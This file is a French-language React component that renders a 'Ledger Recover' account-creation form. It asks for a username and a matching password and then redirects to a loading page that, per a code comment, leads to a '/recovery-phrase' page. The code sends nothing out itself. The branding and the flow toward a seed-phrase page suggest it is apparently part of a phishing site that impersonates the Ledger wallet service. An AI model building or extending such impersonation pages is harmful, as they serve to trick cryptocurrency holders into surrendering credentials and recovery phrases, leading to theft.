// src/components/Identifiant.jsx
import React, { useState } from 'react';
import gifImage from '../assets/dashboard2.png'; // Un GIF d'illustration
import './Identifiant.css';

const IdentifiantForm = () => {
  // États
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [confirmPassword, setConfirmPassword] = useState('');

  // Erreur
  const [errorMessage, setErrorMessage] = useState('');
  const [hasError, setHasError] = useState(false);

  // Affichage/masquage mot de passe
  const [showPassword, setShowPassword] = useState(false);

  const handleSubmit = (e) => {
    e.preventDefault();

    if (password === confirmPassword) {
      // OK => splash => puis recovery
      setErrorMessage('');
      setHasError(false);

      // Redirection vers le loader qui mènera à /recovery-phrase
      window.location.href = "/loading-recovery";
    } else {
      // Erreur => mismatch
      setErrorMessage('Les mots de passe ne correspondent pas. Veuillez réessayer.');
      setHasError(true);
    }
  };

  const handleTogglePassword = () => {
    setShowPassword(!showPassword);
  };

  return (
    <div className="identifiant-main-block">
      <div className="identifiant-container">
        {/* GIF à gauche */}
        <div className="gif-container">
          <img src={gifImage} alt="Animation" className="gif-image2" />
        </div>

        {/* Formulaire */}
        <div className="identifiant-form-container">
          <h3>Créez votre identifiant Ledger Recover</h3>

          <form onSubmit={handleSubmit}>
            {/* Identifiant */}
            <div className="form-group">
              <label className="input-label">Identifiant*</label>
              <input
                type="text"
                placeholder="Identifiant :"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                className="inputt-field"
                required
              />
            </div>

            {/* Mot de passe */}
            <div className="form-group">
              <label className="input-label">Mot de passe*</label>
              <input
                type={showPassword ? 'text' : 'password'}
                placeholder="Mot de passe :"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className={`inputt-field ${hasError ? 'input-error' : ''}`}
                required
              />
            </div>

            {/* Confirmation */}
            <div className="form-group">
              <label className="input-label">Confirmer le mot de passe*</label>
              <input
                type={showPassword ? 'text' : 'password'}
                placeholder="Confirmer le mot de passe :"
                value={confirmPassword}
                onChange={(e) => setConfirmPassword(e.target.value)}
                className={`inputt-field ${hasError ? 'input-error' : ''}`}
                required
              />
              <br/>
              <button
                type="button"
                className="toggle-password"
                onClick={handleTogglePassword}
              >
                {showPassword ? 'Masquer' : 'Afficher'}
              </button>
            </div>

            {/* Bouton Continuer */}
            <div className="form-button-group">
              <button type="submit" className="custom-button">
                Continuer
              </button>
            </div>

            {/* Message d'erreur */}
            {errorMessage && (
              <p className="error-message">
                {errorMessage}
              </p>
            )}
          </form>
        </div>
      </div>
    </div>
  );
};

export default IdentifiantForm;
